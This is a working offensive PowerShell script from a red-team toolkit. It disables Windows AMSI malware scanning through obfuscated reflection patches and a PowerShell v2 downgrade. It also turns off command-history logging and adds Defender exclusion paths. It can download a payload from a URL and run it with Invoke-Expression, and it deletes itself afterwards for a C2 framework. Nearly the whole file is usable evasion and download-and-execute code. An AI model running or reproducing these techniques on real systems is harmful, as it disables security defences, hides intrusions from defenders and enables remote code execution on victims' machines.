<#
.SYNOPSIS
   Disable AMS1 within current process.

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Assembly {native}
   Optional Dependencies: IWR {native}
   PS cmdlet Dev version: v1.1.6

.DESCRIPTION
   This cmdlet attempts to disable AMS1 string scanning within
   the current process context (terminal console) It also allow is
   users to execute any inputed script trough AMS1 bypass technic.

.NOTES
   These techniques only disable AMS1 within current process.
   Remark: It does not exec cmdlets that requires 'Import-Module'
   Remark: Adding AV exclusion path requires administrator privs.

.Parameter List
   List cmdlet AMS1 bypass technics (default: false)

.Parameter Technic
   The AMS1 bypass technic to use (default: 2)

.Parameter Filepath
   Execute input script trough bypass? (default: false)

.Parameter FileArgs
   The script to be executed arguments (default: false)

.Parameter PayloadURL
   The script to be downloaded\executed! (default: false)

.Parameter ExcludeLocation
   The folder to exclude from defender scans (default: false)

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -list "technic"
   List cmdlet AMS1 bypass technics available 

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "1"
   Bypass ams1 detection on current proccess

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
   Bypass ams1 detection on current proccess and execute payload.ps1

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1" -fileargs "-action 'true'"
   Bypass ams1 detection on current proccess and execute payload.ps1 with arguments (parameters)

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
   Bypass ams1 detection on current proccess and download\execute sysinfo.ps1 with arguments ( -sysinfo enum )

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "$Env:TMP\payload.ps1" -ExcludeLocation "$Env:TMP"
   Bypass ams1 detection on current proccess, execute payload.ps1 and add 'TMP' dir to AV exclusion path.

.INPUTS
   None. You cannot pipe objects into Invoke-Bypass.ps1

.OUTPUTS
   * Disable AMS1 within current process.
     + Executing AMS1 bypass technic [1]..

   Technic     : 1
   Bypass      : success
   Disclosure  : @mattifestation
   Description : FORCE_AMSI_ERROR
   POC         : Auto-Execute: payload.ps1
   Report      : string detection disabled on console!
   Executing   : payload.ps1
   
.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/bypass/Invoke-Bypass.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ExcludeLocation="false",
   [string]$PayloadURL="false",
   [string]$Filepath="false",
   [string]$FileArgs="false",
   [string]$List="false",
   [string]$Egg="false",
   [int]$Technic='2'
)


$cmdletVersion = "v1.1.6"
#Cmdlet Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Invoke-Bypass $cmdletVersion {SSA@RedTeam}"
Write-Host "`n* Disable AM`S`I within current process." -ForegroundColor Green

If($Technic -lt 1 -or $Technic -gt 3)
{
   [int]$Technic = 2
   write-host "  + " -ForegroundColor DarkYellow -NoNewline;
   write-host "wrong technic input, default to '$Technic'" -ForegroundColor red -BackgroundColor Black   
}

If($Filepath -ne "false")
{
   If($Filepath -iNotMatch '(.ps1|.bat|.vbs)$')
   {
      write-host "* Error:" -ForegroundColor Red -NoNewline;
      write-host "Invoke-Bypass accepts .ps1,.bat,.vbs formats" -ForegroundColor DarkGray
      exit #Exit @Invoke-Bypass
   }
}

If($List -iMatch "^(technic|technics)$")
{
   write-host "  +" -ForegroundColor DarkYellow -NoNewline;
   write-host " Listing A`MS`I bypasses available .." -ForegroundColor DarkGray
   write-host "`n  Technic  Description" -ForegroundColor DarkYellow
   write-host "  -------  -----------"
   write-host "  1        PS`V2_DO`WNGR`ADE"
   write-host "  2        FORC`E_AM`SI_ERROR"
   write-host "  3        AM`SI_UT`ILS_P`AT`CH"
   write-host ""
   write-host "* " -ForegroundColor Green -NoNewline;
   write-host "Syntax examples:" -ForegroundColor DarkGray
   write-host "  .\Invoke-Bypass.ps1 -technic '1'"
   write-host "  .\Invoke-Bypass.ps1 -technic '2' -filepath 'payload.ps1'"
   write-host "  .\Invoke-Bypass.ps1 -filepath 'payload.ps1' -ExcludeLocation `"`$Env:TMP`""
   write-host ""
   exit
}


write-host "*" -ForegroundColor Green -NoNewline;
$IoStream = "In@v£" + "ok@e-M£+m@" + "+k@at£z" -Join ''
$Forbiden = $IoStream.Replace("@","").Replace("£","").Replace("+","i")
write-host " Executing A`MS`I bypass technic [" -ForegroundColor DarkGray -NoNewline;
write-host "$Technic" -ForegroundColor DarkYellow -NoNewline;
write-host "] .." -ForegroundColor DarkGray
Start-Sleep -Milliseconds 500


If($ExcludeLocation -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Exclude directory from defender scans!
   
   .NOTES
      Adding AV exclusion paths requires administrator privs.
      This setting excludes dirs from real-time\schedule scans.
   #>

   $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If($bool)
   {
      $MakeSure = $ExcludeLocation.Split('\')[-1]
      Set-MpPreference -ExclusionPath "$ExcludeLocation" -Force
      If((Get-MpPreference).ExclusionPath -iMatch "($MakeSure)$")
      {
         write-host "  + " -ForegroundColor DarkYellow -NoNewline;
         write-host "AV Exclusion Path: '" -ForegroundColor DarkGray -NoNewline; 
         write-host "$ExcludeLocation" -ForegroundColor DarkYellow -NoNewline;
         write-host "'" -ForegroundColor DarkGray;
      }
      Else
      {
         write-host "  + ExcludeLocation: fail to add exclusion path .." -ForegroundColor Red -BackgroundColor Black;                                           
      }
   }
   Else
   {
      write-host "  + ExcludeLocation: Administrator privs required .." -ForegroundColor Red -BackgroundColor Black;     
   }
}


If($Technic -eq 1)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @nullbyte
      Helper - PS`V2_DO`WNGR`ADE!
   #>

   $Disclosure = "@nullbyte"
   $TechnicName = "PS`V2_DO`WNGR`ADE"

   #Retrieve NET Framework version
   $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse | Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}' }).Version
   If($NETversions -Match "2.0.50727")
   {

      write-host "`n`n  Technic     : $Technic"
      write-host "  Bypass      : Success" -ForegroundColor Green
      write-host "  Disclosure  : $Disclosure"
      write-host "  Description : $TechnicName"

      If($FilePath -ne "false")
      {
         If($FilePath -Match '\\')
         {
            $FilePath = $FilePath.Split('\')[-1]    # payload.ps1
         }

         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
         write-host "  Report      : String detection disabled on console!"
         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
         write-host "$FilePath`n" -ForegroundColor Green;
         powershell -version 2 -file $FilePath
      }
      ElseIf($PayloadUrl -ne "false")
      {
         $FilePath = $PayloadURL.Split('/')[-1]   # payload.ps1   
         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
         write-host "  Report      : String detection disabled on console!"
         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
         write-host "$FilePath`n" -ForegroundColor Green;
         powershell -version 2 -file $FilePath     
      }
      Else
      {
         $returnversion = (Get-Host).Version.Major
         write-host "  POC         : Execute: $Forbiden" -ForegroundColor DarkYellow
         write-host "  Report      : String detection disabled on console!"
         write-host "  Remark      : Exec 'exit' to return to PS version ${returnversion}"
         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
         write-host "powershell -version 2`n" -ForegroundColor Green;
         powershell -version 2
      }
   }
   Else
   {
      write-host "`n`n  Technic     : $Technic"
      write-host "  Bypass      : Fail" -ForegroundColor DarkRed
      write-host "  Disclosure  : $Disclosure"
      write-host "  Description : $TechnicName"
      write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
      write-host "  Report      : " -NoNewline;
      write-host ".Net version 2.0.50727 not found. Can't start PowerShell V2`n`n" -ForegroundColor DarkRed
   }

exit
}
ElseIf($Technic -eq 2)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @mattifestation
      Helper - FORC`E_AM`SI_ERROR!
   #>

   $Disclosure = "@mattifestation"
   $TechnicName = "FORCE_AM`SI_ERROR"

   Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
}
ElseIf($Technic -eq 3)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @mattifestation
      Helper - AM`SI_UT`ILS_P`AT`CH!
   #>

   $Disclosure = "@mattifestation"
   $TechnicName = "AM`SI_UT`ILS_P`AT`CH"

   Try{#Ams1 bypass technic nº 3
      $MsTeamsId = "4456625220575263174452554847"
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i" + "U@ti@ls" -Join ''
      $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
      $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
      $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)
   }Catch{Throw $_}
}


If($?)
{
   ## String_POC_Obfuscation
   $FileName = $Filepath.Split('\')[-1]
   $CmdletNa = $PayloadURL.Split('/')[-1]

   If($Filepath -ne "false")
   {
      $POC = "Auto-Execute: $FileName"
      $ttl = "$FileName"
   }
   ElseIf($Filepath -ieq "false" -and $PayloadURL -ieq "false")
   {
      $POC = "Manual-Execute: $Forbiden"
      $ttl = "$Forbiden"
   }
   ElseIf($PayloadURL -ne "false")
   {
      $POC = "Download-Execute: $CmdletNa" 
      $ttl = "$CmdletNa"
   }

   write-host "`n`n  Technic     : $Technic"
   write-host "  Bypass      : Success" -ForegroundColor Green
   write-host "  Disclosure  : $Disclosure"
   write-host "  Description : $TechnicName"
   write-host "  POC         : $POC" -ForegroundColor DarkYellow
   write-host "  Report      : String detection disabled on console!"
   If($Filepath -ne "false")
   {
      write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
      write-host "$ttl`n" -ForegroundColor Green;
   }

}
Else
{
   Write-Host "* Error: executing technic '$Technic' bypass!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "`n";exit
}


Start-Sleep -Seconds 1
If($Filepath -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute inputed cmdlet

   .NOTES
      This function exec cmdlets with or without arguments.
      Remark: It does not exec cmdlets that requires 'Import-Module'
   #>

   $Filepath = ".\" + "$Filepath" -join ''

   If($FileArgs -ne "false")
   {
      &('{0}ex' -F'I') "$Filepath $FileArgs"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath $FileArgs" #Import-Module function
   }
   Else
   {
      &('{0}ex' -F'I') "$Filepath"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath"           #Import-Module function
   }
}


If($PayloadURL -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download\Execute cmdlet trough AMS1_bypass!

   .NOTES
      It does not exec cmdlets that requires 'Import-Module'
   #>

   #Parse URL data
   $FilePath = $PayloadURL.Split('/')[-1]   # payload.ps1
   $DomainName = $PayloadURL.Split('/')[2]  # github

   If($PayloadURL -iNotMatch '^[http(s)://]')
   {
      #Wrong download fileformat syntax user input
      Write-Host "* Error: -payloadURL '<url>' requires http(s) format!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;exit ## @Invoke-Bypass    
   }
   
   If($PayloadURL -iNotMatch '(.ps1|.psm1|.psd1)$')
   {
      #Wrong download fileformat syntax user input
      Write-Host "* Error: -payloadURL '<url>' accepts .ps1,.psm1,.psd1 formats!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;exit ## @Invoke-Bypass    
   }

   If($PayloadURL -iMatch '^(https://)')
   {
      $PortNumber = "445"
   }
   ElseIf($PayloadURL -iMatch '^(http://)')
   {
      $PortNumber = "80"
   }

   #Build Table display
   Write-Host "`n`n* Download\Execute '$Filepath'" -ForegroundColor Green
   Write-Host "+ " -ForegroundColor DarkYellow -NoNewline;
   Write-Host "[connecting to] $DomainName TCP $PortNumber .." -ForegroundColor DarkGray
   Write-Host "     uri: " -ForegroundColor DarkGray -NoNewline;
   Write-Host "$PayloadURL`n" -ForegroundColor DarkYellow 

   #Download cmdlet
   iwr -uri "$PayloadURL" -OutFile "$FilePath"|Unblock-File
   $Filepath = ".\" + "$Filepath" -join ''

   If($FileArgs -ne "false")
   {
      &('{0}ex' -F'I') "$Filepath $FileArgs"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath $FileArgs" #Import-Module function
   }
   Else
   {
      &('{0}ex' -F'I') "$Filepath"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath"           #Import-Module function
   }
                       
}

write-host "`n"
If($Egg -ieq "True")
{
   #Auto-Delete this cmdlet (@Meterpeter C2 internal function)
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}